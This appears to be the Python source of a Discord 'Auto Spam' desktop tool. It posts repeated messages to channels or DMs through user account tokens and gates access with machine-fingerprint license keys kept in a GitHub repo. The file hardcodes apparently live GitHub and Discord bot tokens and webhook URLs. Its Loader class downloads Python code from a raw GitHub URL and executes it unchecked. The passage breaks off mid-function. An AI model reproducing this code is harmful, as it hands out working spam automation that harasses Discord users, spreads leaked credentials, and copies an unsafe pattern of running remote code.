import tkinter as tk
from tkinter import ttk, messagebox, simpledialog
import threading
import time
import requests
import json
import os
import sys
import logging
from ttkthemes import ThemedTk
from datetime import datetime, timedelta, timezone
import hashlib
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import wmi
import certifi
from PIL import Image, ImageTk  
from io import BytesIO
import importlib.util
import tempfile

def setup_cert():
    cert_path = os.path.join(os.path.dirname(__file__), "cacert.pem")
    return os.path.abspath(cert_path)

# Konfigurasi logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='autospam.log'
)

logging.basicConfig(level=logging.DEBUG)

REGISTERED_WEBHOOK_URL = "https://discord.com/api/webhooks/1339789514939301929/bw3X6IFlPrTIAr8THkPTZFFFjrB0GDNY4XuYaXCmYxG0Hjv3mJrwiaPr_gil6VXVcrYS"
UNREGISTERED_WEBHOOK_URL = "https://discord.com/api/webhooks/1339789719743234142/cihd4V7J6jvzU7SQioQdNZ2Gkrff4fbLsWAgi-9XsktyVq9XzA98Sg3YAWl6QI8ZNXeh"
GITHUB_API_URL = "https://api.github.com/repos/MuradNi/TrialPost"
GITHUB_TOKEN = "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"
BOT_TOKEN = "MTI3NjAyMzE2NTQwMjg3MzkzOA.GnQbIU.D9-TeSHbL6-3izBCGeUOv5tRYgK9GUrGwrOUyU"  # Replace with your Discord bot token
SERVER_ID = "1203354176139305061" 

def log_and_print(message):
    print(message)
    logging.info(message)

def send_uuid_status_webhook(url, content, is_registered=True, user_id=None):
    """Send webhook with rate limiting and duplicate prevention"""
    try:
        # Rate limiting check
        current_time = time.time()
        if hasattr(send_uuid_status_webhook, 'last_sent'):
            if (current_time - send_uuid_status_webhook.last_sent) < 5:
                return  # Skip if less than 5 seconds since last webhook
        
        send_uuid_status_webhook.last_sent = current_time
        
        # Create webhook payload
        timestamp = datetime.now(timezone.utc).isoformat()
        formatted_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        embed = {
            "title": "Auto Spam User Status",
            "description": f"User <@{user_id}> has {'logged in' if is_registered else 'logged out'}" if user_id else content,
            "color": 0x00FF00 if is_registered else 0xFF0000,
            "timestamp": timestamp,
            "image": {"url": "https://i.ibb.co.com/f1ZScNq/standard-2.gif"},
            "footer": {
                "text": "Auto Message Log",
                "icon_url": "https://i.ibb.co/FwddMLs/image.png"
            },
            "thumbnail": {
                "url": "https://i.ibb.co/FwddMLs/image.png"
            },
            "fields": [
                {"name": "Time", "value": formatted_time, "inline": True},
                {"name": "Status", "value": "Active Session" if is_registered else "Session Ended", "inline": True}
            ]
        }
        
        payload = {
            "embeds": [embed],
            "username": "SECURITY AUTO POSTED",
            "avatar_url": "https://ibb.co.com/Y8JHcjh"
        }
        
        # Send webhook with timeout
        response = requests.post(url, json=payload, timeout=5)
        response.raise_for_status()
        
    except Exception as e:
        logging.error(f"Error sending webhook: {str(e)}")

def generate_device_id():
    c = wmi.WMI()
    cpu = c.Win32_Processor()[0]
    bios = c.Win32_BIOS()[0]
    return hashlib.sha256(f"{cpu.ProcessorId}.{bios.SerialNumber}".encode()).hexdigest()

def get_valid_keys():
    try:
        headers = {"Authorization": f"token {GITHUB_TOKEN}"}
        url = f"{GITHUB_API_URL}/contents/Keys.Tann18.json"
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        content = base64.b64decode(response.json()["content"]).decode('utf-8')
        return json.loads(content)
    except Exception as e:
        logging.error(f"Error getting keys from GitHub: {str(e)}")
        return {"keys": {}}

def check_key():
    try:
        device_id = generate_device_id()
        valid_keys = get_valid_keys()
        
        # Check if this device already has an active key
        for key, info in valid_keys['keys'].items():
            if info.get('device_id') == device_id and info['status'] == 'used':
                # Device already has an active key
                is_member, message = check_discord_membership(
                    info['discord_id'], 
                    SERVER_ID,
                    BOT_TOKEN
                )
                if is_member:
                    send_uuid_status_webhook(
                        REGISTERED_WEBHOOK_URL, 
                        "Login successful", 
                        is_registered=True, 
                        user_id=info['discord_id']
                    )
                    return True, "Key valid untuk perangkat ini."
                
        return False, "Tidak ada key yang aktif untuk perangkat ini."
        
    except Exception as e:
        logging.error(f"Error checking key: {str(e)}")
        return False, f"Terjadi kesalahan saat memeriksa key: {str(e)}"

def update_github_keys(updated_keys):
    try:
        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        current_file = requests.get(f"{GITHUB_API_URL}/contents/Keys.Tann18.json", headers=headers)
        current_file.raise_for_status()
        current_sha = current_file.json()['sha']

        # Encode konten baru
        content = json.dumps(updated_keys, indent=2)
        content_bytes = content.encode('utf-8')
        base64_bytes = base64.b64encode(content_bytes)
        base64_string = base64_bytes.decode('utf-8')

        data = {
            "message": "Update keys",
            "content": base64_string,
            "sha": current_sha
        }
        
        response = requests.put(f"{GITHUB_API_URL}/contents/Keys.Tann18.json", headers=headers, json=data)
        response.raise_for_status()
        log_and_print("Keys updated successfully in GitHub")
        return True
    except requests.exceptions.RequestException as e:
        log_and_print(f"Error updating keys in GitHub: {str(e)}")
        if hasattr(e, 'response') and e.response is not None:
            log_and_print(f"Response content: {e.response.content}")
        return False

def check_discord_membership(discord_id, guild_id, bot_token):
    try:
        headers = {
            'Authorization': f'Bot {bot_token}',
            'Content-Type': 'application/json'
        }
        
        # Check guild membership directly
        response = requests.get(
            f'https://discord.com/api/v9/guilds/{guild_id}/members/{discord_id}',
            headers=headers
        )
        
        if response.status_code == 200:
            return True, "User terdaftar di server."
        else:
            return False, "User tidak terdaftar di server Discord."
            
    except Exception as e:
        logging.error(f"Error checking Discord membership: {str(e)}")
        return False, f"Error memeriksa keanggotaan Discord: {str(e)}"

def activate_key(entered_key):
    try:
        valid_keys = get_valid_keys()
        
        if entered_key not in valid_keys['keys']:
            return False, "Key tidak valid.", None
            
        key_info = valid_keys['keys'][entered_key]
        
        if key_info['status'] != 'active':
            return False, "Key sudah digunakan.", None
            
        device_id = generate_device_id()
        
        # Check if device already has another key
        for key, info in valid_keys['keys'].items():
            if info.get('device_id') == device_id and info['status'] == 'used':
                return False, "Perangkat ini sudah memiliki key yang aktif.", None
        
        discord_id = simpledialog.askstring("Discord ID", "Masukkan User ID Discord Anda:")
        if not discord_id:
            return False, "User ID Discord diperlukan.", None
            
        is_member, message = check_discord_membership(discord_id, SERVER_ID, BOT_TOKEN)
        if not is_member:
            return False, message, None
        
        valid_keys['keys'][entered_key].update({
            'status': 'used',
            'discord_id': discord_id,
            'device_id': device_id
        })
        
        if update_github_keys(valid_keys):
            send_uuid_status_webhook(
                REGISTERED_WEBHOOK_URL, 
                "Key activation successful", 
                is_registered=True, 
                user_id=discord_id
            )
            return True, "Key berhasil diaktifkan.", entered_key
        else:
            return False, "Gagal mengupdate status key. Coba lagi.", None
            
    except Exception as e:
        logging.error(f"Error activating key: {str(e)}")
        return False, f"Error saat aktivasi key: {str(e)}", None

def deactivate_key(root):
    try:
        if messagebox.askyesno("Konfirmasi", "Apakah Anda yakin ingin logout?"):
            device_id = generate_device_id()
            valid_keys = get_valid_keys()
            
            found_key = None
            discord_id = None
            for key, info in valid_keys['keys'].items():
                if info.get('device_id') == device_id:
                    found_key = key
                    discord_id = info.get('discord_id')
                    break
                    
            if found_key:
                valid_keys['keys'][found_key].update({
                    'status': 'active',
                    'device_id': None,
                    'discord_id': None
                })
                
                if update_github_keys(valid_keys):
                    # Show closing dialog
                    closing_dialog = ClosingDialog(root)
                    root.wait_window(closing_dialog.dialog)
                    
                    # Send webhook
                    send_uuid_status_webhook(
                        REGISTERED_WEBHOOK_URL,
                        "Session ended",
                        is_registered=False,
                        user_id=discord_id
                    )
                    
                    # Destroy root window
                    root.destroy()
                    return True, "Successfully logged out."
            return False, "No active key found for this device."
    except Exception as e:
        logging.error(f"Error during logout: {str(e)}")
        return False, f"Error during logout: {str(e)}"

class ClosingDialog:
    def __init__(self, parent):
        self.dialog = tk.Toplevel(parent)
        self.dialog.title("Closing Application")
        self.dialog.geometry("400x300")
        self.dialog.transient(parent)
        self.dialog.grab_set()
        self.dialog.configure(bg="#2b2b2b")
        
        # Style configuration
        style = ttk.Style()
        style.configure("Custom.TFrame", background="#2b2b2b")
        style.configure("Custom.TLabel", background="#2b2b2b", foreground="white", font=("Helvetica", 12))
        style.configure("RedAccent.TButton", background="#ff4444", foreground="white")
        
        # Main frame
        self.frame = ttk.Frame(self.dialog, style="Custom.TFrame", padding="20")
        self.frame.pack(fill=tk.BOTH, expand=True)
        
        # Title
        title_label = ttk.Label(
            self.frame, 
            text="Thank You for Using Auto Spam",
            font=("Helvetica", 14, "bold"),
            style="Custom.TLabel"
        )
        title_label.pack(pady=(0, 20))
        
        # Message
        msg_label = ttk.Label(
            self.frame,
            text="Your session has been ended successfully.\nThank you for using our application!",
            justify=tk.CENTER,
            style="Custom.TLabel"
        )
        msg_label.pack(pady=(0, 30))
        
        # Progress bar with faster updates
        self.progress = ttk.Progressbar(self.frame, mode="determinate", length=300)
        self.progress.pack(pady=(0, 20))
        
        # Start progress with faster increments
        self.progress_value = 0
        self.update_progress()
        
        # Center the dialog
        self.center_dialog()
    
    def center_dialog(self):
        self.dialog.update_idletasks()
        width = self.dialog.winfo_width()
        height = self.dialog.winfo_height()
        x = (self.dialog.winfo_screenwidth() // 2) - (width // 2)
        y = (self.dialog.winfo_screenheight() // 2) - (height // 2)
        self.dialog.geometry(f'+{x}+{y}')
    
    def update_progress(self):
        if self.progress_value < 100:
            self.progress_value += 5  # Faster increment
            self.progress["value"] = self.progress_value
            self.dialog.after(10, self.update_progress)  # Update more frequently
    
    def close(self):
        self.dialog.destroy()

class KeyActivationDialog:
    def __init__(self, parent):
        self.dialog = tk.Toplevel(parent)
        self.dialog.title("Aktivasi Key")
        self.dialog.geometry("300x150")
        self.dialog.transient(parent)
        self.dialog.grab_set()
        
        self.result = None
        
        ttk.Label(self.dialog, text="Masukkan Key:").pack(pady=10)
        self.key_entry = ttk.Entry(self.dialog)
        self.key_entry.pack(pady=5)
        
        ttk.Button(self.dialog, text="Aktivasi", command=self.activate).pack(pady=10)
        
        # Center the dialog
        self.dialog.update_idletasks()
        width = self.dialog.winfo_width()
        height = self.dialog.winfo_height()
        x = (self.dialog.winfo_screenwidth() // 2) - (width // 2)
        y = (self.dialog.winfo_screenheight() // 2) - (height // 2)
        self.dialog.geometry(f'+{x}+{y}')
    
    def activate(self):
        key = self.key_entry.get().strip()
        if key:
            self.result = key
            self.dialog.destroy()

class Loader:
    def __init__(self):
        self.window = tk.Tk()
        self.window.title("Auto Spam Loader")
        self.window.geometry("400x200")
        
        self.label = tk.Label(self.window, text="Memuat aplikasi dari GitHub...")
        self.label.pack(pady=20)
        
        self.progress = tk.Label(self.window, text="Memeriksa pembaruan...")
        self.progress.pack(pady=10)
        
        # Mulai proses loading
        self.window.after(1000, self.load_from_github)
        
        self.window.mainloop()
    
    def load_from_github(self):
        try:
            self.progress.config(text="Mengunduh kode terbaru...")
            
            # URL ke file Python raw di GitHub (ganti dengan URL Anda)
            github_url = "https://raw.githubusercontent.com/MuradNi/adwdawdawdaw/refs/heads/main/tes.py"
            
            # Unduh kode
            response = requests.get(github_url)
            if response.status_code != 200:
                raise Exception(f"Gagal mengunduh: {response.status_code}")
            
            code = response.text
            
            # Simpan ke file temporary
            with tempfile.NamedTemporaryFile(suffix=".py", delete=False) as temp_file:
                temp_path = temp_file.name
                temp_file.write(code.encode())
            
            self.progress.config(text="Menjalankan aplikasi...")
            
            # Import dan jalankan
            spec = importlib.util.spec_from_file_location("autospam_module", temp_path)
            module = importlib.util.module_from_spec(spec)
            sys.modules["autospam_module"] = module
            spec.loader.exec_module(module)
            
            # Tutup window loader
            self.window.destroy()
            
            # Jalankan aplikasi utama
            if hasattr(module, 'main'):
                module.main()
            elif hasattr(module, 'AutoSpamGUI'):
                # Buat window baru untuk aplikasi utama
                root = tk.Tk()
                app = module.AutoSpamGUI(root)
                root.mainloop()
            
        except Exception as e:
            self.progress.config(text=f"Error: {str(e)}")

class AutoSpamGUI:
    def __init__(self, master):
        self.master = master
        master.title("Auto Spam by Murad")
        master.geometry("900x600")
        
        self.key_validated = False  # Reset key validation flag
        
        self.main_frame = ttk.Frame(master)
        self.main_frame.pack(fill=tk.BOTH, expand=True)
    
        self.canvas = tk.Canvas(self.main_frame)
        self.canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
    
        self.scrollbar = ttk.Scrollbar(self.main_frame, orient=tk.VERTICAL, command=self.canvas.yview)
        self.scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
    
        self.canvas.configure(yscrollcommand=self.scrollbar.set)
        self.canvas.bind('<Configure>', lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all")))
    
        self.scrollable_frame = ttk.Frame(self.canvas)
        self.canvas.create_window((0, 0), window=self.scrollable_frame, anchor="nw")
    
        self.scrollable_frame.bind("<Enter>", self._bound_to_mousewheel)
        self.scrollable_frame.bind("<Leave>", self._unbound_to_mousewheel)
    
        self.style = ttk.Style(master)
        self.style.theme_use("clam")
    
        self.stop_event = threading.Event()
        self.spam_threads = []
    
        self.config_file = self.get_config_path()
        self.load_config()
    
        self.cert_path = self.setup_cert()
        self.tokens = []  # Initialize tokens list
    
        self.selected_token = tk.StringVar()
        self.is_dm = tk.BooleanVar(value=False)
        
        self.is_running = False
        self.start_time = datetime.now()
    
        self.message_count = 0
    
        self.channel_threads = {}
    
        self.channel_status = {}
        self.channel_status_lock = threading.Lock()
    
        self.status_tree = None
    
        self.notebook = ttk.Notebook(self.scrollable_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True)
    
        self.current_theme = "light"
        self.set_theme("#f0f0f0", "#333333", "#4CAF50", "white")
    
        self.create_widgets()  # Create widgets first
        self.create_status_widgets()
        self.load_tokens()  # Load tokens after widgets are created
        self.load_initial_configurations()
        self.status_update_job = None
        self.check_registration_status()
    
        # Check if already logged in
        is_registered, message = check_key()
        if not is_registered:
            self.show_key_activation()
            if not hasattr(self, 'key_validated') or not self.key_validated:
                master.destroy()  # Close if no valid key
                return

    def show_logout_button(self):
        if not hasattr(self, 'logout_button'):
            self.logout_button = ttk.Button(
                self.scrollable_frame,
                text="Logout",
                command=self.handle_logout,
                style="Accent.TButton"
            )
            self.logout_button.pack(pady=10)

    def hide_logout_button(self):
        if hasattr(self, 'logout_button'):
            self.logout_button.pack_forget()

    def handle_logout(self):
        if messagebox.askyesno("Confirm Logout", "Are you sure you want to logout?"):
            success, message = self.deactivate_and_restart()
            if not success:
                messagebox.showerror("Error", message)

    def deactivate_and_restart(self):
        """Handle logout and restart process"""
        try:
            device_id = generate_device_id()
            valid_keys = get_valid_keys()

            # Find current key
            found_key = None
            discord_id = None
            for key, info in valid_keys['keys'].items():
                if info.get('device_id') == device_id:
                    found_key = key
                    discord_id = info.get('discord_id')
                    break

            if not found_key:
                return False, "No active key found for this device."

            # Update key status
            valid_keys['keys'][found_key].update({
                'status': 'active',
                'device_id': None,
                'discord_id': None
            })

            if not update_github_keys(valid_keys):
                return False, "Failed to update key status."

            # Send webhook before showing dialog
            send_uuid_status_webhook(
                REGISTERED_WEBHOOK_URL,
                "Session ended",
                is_registered=False,
                user_id=discord_id
            )

            # Clean up threads and stop ongoing processes
            self.stop_spam_with_status()

            # Show closing dialog
            closing_dialog = ClosingDialog(self.master)
            self.master.after(1500, closing_dialog.dialog.destroy)  # Auto-close after 1.5 seconds
            self.master.wait_window(closing_dialog.dialog)

            # Destroy main window and restart application
            self.clean_up_widgets()
            self.master.withdraw()

            # Restart the application flow (similar to main())
            loading_window = show_loading_window(self.master)

            def after_restart():
                if loading_window:
                    loading_window.destroy()
                if not check_and_activate_key(self.master):
                    self.master.destroy()
                    return

                start_main_application(self.master)

            self.master.after(1000, after_restart)
            return True, "Successfully logged out."

        except Exception as e:
            logging.error(f"Error during logout and restart: {str(e)}")
            return False, f"Error during logout: {str(e)}"

    def restart_key_activation(self):
        while True:
            key = simpledialog.askstring("Aktivasi", "Masukkan key untuk aktivasi:")
            if key:
                is_activated, activation_message, activated_key = activate_key(key)
                if is_activated:
                    messagebox.showinfo("Info", activation_message + "\nAplikasi berjalan...")
                    # Reinitialize the application with the new key
                    self.master.deiconify()  # Show main window again
                    start_main_application(self.master)
                    break
                else:
                    retry = messagebox.askretrycancel("Error", activation_message + "\nCoba lagi?")
                    if not retry:
                        self.master.destroy()
                        break
            else:
                self.master.destroy()
                break
    
    def show_key_activation(self):
        dialog = KeyActivationDialog(self.master)
        self.master.wait_window(dialog.dialog)
        
        if dialog.result:
            success, message, key = activate_key(dialog.result)
            if success:
                messagebox.showinfo("Success", message)
                self.key_validated = True
                self.check_registration_status()
            else:
                messagebox.showerror("Error", message)
                self.key_validated = False
                self.show_key_activation()
    
    def check_registration_status(self):
        is_registered, message = check_key()
        if is_registered:
            self.show_logout_button()
            self.enable_app_features()
        else:
            self.hide_logout_button()
            self.disable_app_features()
            self.show_key_activation()
    
    def enable_app_features(self):
        # Enable all app features/widgets
        for child in self.scrollable_frame.winfo_children():
            if isinstance(child, (ttk.Entry, ttk.Button, tk.Text)):
                child.configure(state='normal')
    
    def disable_app_features(self):
        # Disable all app features/widgets except logout button
        for child in self.scrollable_frame.winfo_children():
            if isinstance(child, (ttk.Entry, ttk.Button, tk.Text)) and child != self.logout_button:
                child.configure(state='disabled')

    def set_theme(self, bg_color, fg_color, button_bg, button_fg):
        self.style.configure("TFrame", background=bg_color)
        self.style.configure("TButton", background=button_bg, foreground=button_fg)
        self.style.configure("TLabel", background=bg_color, foreground=fg_color)
        self.style.configure("TEntry", fieldbackground="white")
        self.style.configure("Treeview", background="white", fieldbackground="white", foreground=fg_color)
        self.style.configure("Treeview.Heading", background="#dcdcdc", foreground=fg_color)
        
        self.master.configure(bg=bg_color)
        self.scrollable_frame.configure(style="TFrame")
        self.canvas.configure(bg=bg_color)

    def toggle_theme(self):
        if self.current_theme == "light":
            self.set_theme("#333333", "#ffffff", "#555555", "white")
            self.current_theme = "dark"
        else:
            self.set_theme("#f0f0f0", "#333333", "#4CAF50", "white")
            self.current_theme = "light"

    def _bound_to_mousewheel(self, event):
        self.canvas.bind_all("<MouseWheel>", self._on_mousewheel)

    def _unbound_to_mousewheel(self, event):
        self.canvas.unbind_all("<MouseWheel>")

    def _on_mousewheel(self, event):
        self.canvas.yview_scroll(int(-1*(event.delta/120)), "units")

    def get_config_path(self):
        if getattr(sys, 'frozen', False):
            base_path = os.path.dirname(sys.executable)
        else:
            base_path = os.path.dirname(os.path.abspath(__file__))
        return os.path.join(base_path, 'config.json')

    def load_config(self):
        if not os.path.exists(self.config_file):
            self.config = {
                "tokens": {},
                "webhook_url": "",
                "webhook_channel_id": "",
                "channels": []
            }
            self.save_config()
        else:
            try:
                with open(self.config_file, 'r') as f:
                    self.config = json.load(f)
            except json.JSONDecodeError:
                logging.error("Failed to parse config file. Using default configuration.")
                self.config = {
                    "tokens": {},
                    "webhook_url": "",
                    "webhook_channel_id": "",
                    "channels": []
                }

        logging.info(f"Loaded config. Webhook URL: {self.config.get('webhook_url', 'Not set')}")
        logging.info(f"Number of saved tokens: {len(self.config['tokens'])}")

    def save_config(self):
        with open(self.config_file, 'w') as f:
            json.dump(self.config, f, indent=4)
        self.update_channel_status()

    def clean_up_widgets(self):
        """Safely clean up all widgets and bindings"""
        try:
            # Remove all bindings
            if hasattr(self, 'scrollable_frame'):
                self.scrollable_frame.unbind("<Enter>")
                self.scrollable_frame.unbind("<Leave>")
                self.scrollable_frame.unbind_all("<MouseWheel>")
                self.scrollable_frame.unbind_all("<Button-4>")
                self.scrollable_frame.unbind_all("<Button-5>")

            # Cancel all scheduled tasks
            if hasattr(self, 'status_update_job'):
                self.master.after_cancel(self.status_update_job)
                self.status_update_job = None

            # Destroy all widgets in reverse order
            if hasattr(self, 'scrollable_frame'):
                for widget in self.scrollable_frame.winfo_children():
                    widget.destroy()

            if hasattr(self, 'canvas'):
                self.canvas.delete('all')
                self.canvas.destroy()

            if hasattr(self, 'scrollbar'):
                self.scrollbar.destroy()

            if hasattr(self, 'main_frame'):
                self.main_frame.destroy()

        except Exception as e:
            logging.error(f"Error cleaning up widgets: {str(e)}")

    def reinitialize_gui(self):
        """Reinitialize the GUI after cleanup"""
        try:
            # Create new main frame
            self.main_frame = ttk.Frame(self.master)
            self.main_frame.pack(fill=tk.BOTH, expand=True)

            # Create new canvas
            self.canvas = tk.Canvas(self.main_frame)
            self.canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

            # Create new scrollbar
            self.scrollbar = ttk.Scrollbar(self.main_frame, orient=tk.VERTICAL, command=self.canvas.yview)
            self.scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

            self.canvas.configure(yscrollcommand=self.scrollbar.set)
            self.canvas.bind('<Configure>', lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all")))

            # Create new scrollable frame
            self.scrollable_frame = ttk.Frame(self.canvas)
            self.canvas.create_window((0, 0), window=self.scrollable_frame, anchor="nw")

            # Rebind mouse wheel
            self.scrollable_frame.bind("<Enter>", self._bound_to_mousewheel)
            self.scrollable_frame.bind("<Leave>", self._unbound_to_mousewheel)

            # Recreate notebook
            self.notebook = ttk.Notebook(self.scrollable_frame)
            self.notebook.pack(fill=tk.BOTH, expand=True)

            # Reset any necessary instance variables
            self.channel_status = {}
            self.status_update_job = None

            # Create widgets
            self.create_widgets()
            self.create_status_widgets()
            self.load_tokens()
            self.load_initial_configurations()

        except Exception as e:
            logging.error(f"Error reinitializing GUI: {str(e)}")
            messagebox.showerror("Error", "Failed to reinitialize application. Please restart.")

    def create_widgets(self):
    # Configuration Tab
        config_frame = ttk.Frame(self.notebook, padding="10")
        self.notebook.add(config_frame, text="Configuration")
        config_frame.columnconfigure(1, weight=1)

        # Channel Configuration
        ttk.Label(config_frame, text="Channel ID:").grid(row=0, column=0, sticky="w", pady=5)
        self.channel_id_entry = ttk.Entry(config_frame)
        self.channel_id_entry.grid(row=0, column=1, sticky="ew", pady=5)

        ttk.Label(config_frame, text="Channel Name:").grid(row=1, column=0, sticky="w", pady=5)
        self.channel_name_entry = ttk.Entry(config_frame)
        self.channel_name_entry.grid(row=1, column=1, sticky="ew", pady=5)

        ttk.Label(config_frame, text="Text to Post:").grid(row=2, column=0, sticky="nw", pady=5)
        self.message_text = tk.Text(config_frame, height=5)
        self.message_text.grid(row=2, column=1, sticky="ew", pady=5)

        # Time Interval
        ttk.Label(config_frame, text="Time Interval:").grid(row=3, column=0, sticky="w", pady=5)
        time_frame = ttk.Frame(config_frame)
        time_frame.grid(row=3, column=1, sticky="w", pady=5)

        time_units = ["Weeks", "Days", "Hours", "Minutes", "Seconds"]
        for i, unit in enumerate(time_units):
            ttk.Label(time_frame, text=f"{unit}:").grid(row=0, column=i*2, padx=(0, 2))
            entry = ttk.Entry(time_frame, width=5)
            entry.grid(row=0, column=i*2+1, padx=(0, 10))
            setattr(self, f"{unit.lower()}_entry", entry)

        # Ping User
        ttk.Label(config_frame, text="Ping User ID:").grid(row=4, column=0, sticky="w", pady=5)
        self.ping_user_entry = ttk.Entry(config_frame)
        self.ping_user_entry.grid(row=4, column=1, sticky="ew", pady=5)

        # Checkboxes
        self.is_dm_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(config_frame, text="Send as DM", variable=self.is_dm_var, command=self.toggle_dm_channel).grid(row=5, column=1, sticky="w", pady=5)

        self.auto_delete_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(config_frame, text="Auto Delete Previous Message", variable=self.auto_delete_var).grid(row=6, column=1, sticky="w", pady=5)

        # Token Selection
        ttk.Label(config_frame, text="Token:").grid(row=7, column=0, sticky="nw", pady=5)
        token_frame = ttk.Frame(config_frame)
        token_frame.grid(row=7, column=1, sticky="ew", pady=5)

        self.token_listbox = tk.Listbox(token_frame, height=5)
        self.token_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        token_scrollbar = ttk.Scrollbar(token_frame, orient=tk.VERTICAL, command=self.token_listbox.yview)
        token_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.token_listbox.config(yscrollcommand=token_scrollbar.set)

        # Token Buttons
        token_button_frame = ttk.Frame(config_frame)
        token_button_frame.grid(row=8, column=1, sticky="w", pady=5)

        ttk.Button(token_button_frame, text="Select Token", command=self.select_token).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(token_button_frame, text="Add Token", command=self.add_token).pack(side=tk.LEFT, padx=5)
        ttk.Button(token_button_frame, text="Remove Token", command=self.remove_token).pack(side=tk.LEFT, padx=5)

        self.selected_token_label = ttk.Label(config_frame, text="Selected Token: None")
        self.selected_token_label.grid(row=9, column=1, sticky="w", pady=5)

        # Configuration Buttons
        button_frame = ttk.Frame(config_frame)
        button_frame.grid(row=10, column=1, sticky="w", pady=10)

        ttk.Button(button_frame, text="Start All", command=self.start_all_spam_with_status).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(button_frame, text="Stop All", command=self.stop_spam_with_status).pack(side=tk.LEFT, padx=(0, 5))

        buttons = [
            ("Add Configuration", self.add_config),
            ("Edit Configuration", self.edit_channel),
            ("Delete Configuration", self.show_delete_dialog),
            ("Toggle Theme", self.toggle_theme)
        ]

        for text, command in buttons:
            ttk.Button(button_frame, text=text, command=command).pack(side=tk.LEFT, padx=(0, 5))

        # Add Overall Status Label
        self.overall_status_label = ttk.Label(config_frame, text="Overall Status: Stopped")
        self.overall_status_label.grid(row=11, column=1, sticky="w", pady=5)

        # Webhook Tab
        webhook_frame = ttk.Frame(self.notebook, padding="10")
        self.notebook.add(webhook_frame, text="Webhook")
        webhook_frame.columnconfigure(1, weight=1)

        ttk.Label(webhook_frame, text="Webhook URL:").grid(row=0, column=0, sticky="w", pady=5)
        self.webhook_url_entry = ttk.Entry(webhook_frame)
        self.webhook_url_entry.grid(row=0, column=1, sticky="ew", pady=5)

        ttk.Label(webhook_frame, text="Webhook Channel ID:").grid(row=1, column=0, sticky="w", pady=5)
        self.webhook_channel_id_entry = ttk.Entry(webhook_frame)
        self.webhook_channel_id_entry.grid(row=1, column=1, sticky="ew", pady=5)

        ttk.Button(webhook_frame, text="Test Webhook", command=self.test_webhook_connection).grid(row=2, column=1, sticky="w", pady=10)
        ttk.Button(webhook_frame, text="Save Settings", command=self.save_settings).grid(row=3, column=1, sticky="w", pady=10)

        self.style.configure(
        "Accent.TButton",
        background="#ff4444",
        foreground="white",
        padding=5
        )
        pass

    def create_status_widgets(self):
        status_frame = ttk.Frame(self.notebook)
        self.notebook.add(status_frame, text="Status")

        tree_frame = ttk.Frame(status_frame)
        tree_frame.pack(fill="both", expand=True, padx=10, pady=10)

        columns = ("Channel", "Status", "Running Time", "Messages Sent", "Last Message Time", "Interval", "Action")
        self.status_tree = ttk.Treeview(tree_frame, columns=columns, show="headings")

        column_widths = {
            "Channel": 150,
            "Status": 100,
            "Running Time": 100,
            "Messages Sent": 100,
            "Last Message Time": 150,
            "Interval": 100,
            "Action": 100
        }

        for col in columns:
            self.status_tree.heading(col, text=col)
            self.status_tree.column(col, width=column_widths[col], anchor="center")

        scrollbar = ttk.Scrollbar(tree_frame, orient="vertical", command=self.status_tree.yview)
        self.status_tree.configure(yscrollcommand=scrollbar.set)

        self.status_tree.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")

        self.style.configure("Treeview", rowheight=30)
        self.style.configure("Treeview.Cell", padding=(3, 3, 3, 3))

        status_info_frame = ttk.Frame(status_frame)
        status_info_frame.pack(fill="x", padx=10, pady=(10, 0))

        self.overall_status_label = ttk.Label(status_info_frame, text="Overall Status: Stopped")
        self.overall_status_label.pack(side="left", padx=(0, 20))

        self.total_messages_label = ttk.Label(status_info_frame, text="Total Messages Sent: 0")
        self.total_messages_label.pack(side="left")

        button_frame = ttk.Frame(status_frame)
        button_frame.pack(fill="x", padx=10, pady=10)

        self.style.configure("Bordered.TButton", borderwidth=2, relief="raised")

        self.refresh_button = ttk.Button(button_frame, text="Refresh Status", 
                                         command=self.update_status_display, 
                                         style="Bordered.TButton")
        self.refresh_button.pack(side="left", padx=5)

        self.status_tree.bind("<Double-1>", self.on_tree_double_click)
        self.status_tree.bind("<ButtonRelease-1>", self.on_tree_click)

        self.master.after(1000, self.update_status_display)

    def setup_cert(self):
        return certifi.where()

    def on_tree_double_click(self, event):
        item = self.status_tree.identify('item', event.x, event.y)
        column = self.status_tree.identify('column', event.x, event.y)
        if column == '#7':  # Action column
            # Get full details from the selected row
            channel_id = self.status_tree.item(item, "text")
            values = self.status_tree.item(item, "values")
            token_name = values[1]  # Token name is in the second column
            current_status = values[2]  # Status is in the third column

            # Create a unique status key
            status_key = f"{channel_id}_{token_name}"

            if current_status == "Running":
                self.stop_single_spam(status_key)
            else:
                # Find the specific channel configuration matching both channel_id and token_name
                channel_config = self.get_specific_channel_config(channel_id, token_name)
                if channel_config:
                    self.start_single_spam(channel_config)

    def on_tree_click(self, event):
        region = self.status_tree.identify("region", event.x, event.y)
        if region == "cell":
            column = self.status_tree.identify_column(event.x)
            if column == "#7":  # Action column
                item = self.status_tree.identify_row(event.y)
                if not item:
                    return

                values = self.status_tree.item(item)['values']
                if not values:
                    return

                channel_id = self.status_tree.item(item)['text']
                token_name = values[1]  # Get token name from the second column

                # Create status key consistent with the rest of the application
                status_key = f"{channel_id}_{token_name}"

                current_status = None
                with self.channel_status_lock:
                    # Use the status_key format in channel_status
                    status_key = f"{channel_id}_{token_name}"
                    if status_key in self.channel_status:
                        current_status = self.channel_status[status_key]['status']

                if current_status == "Running":
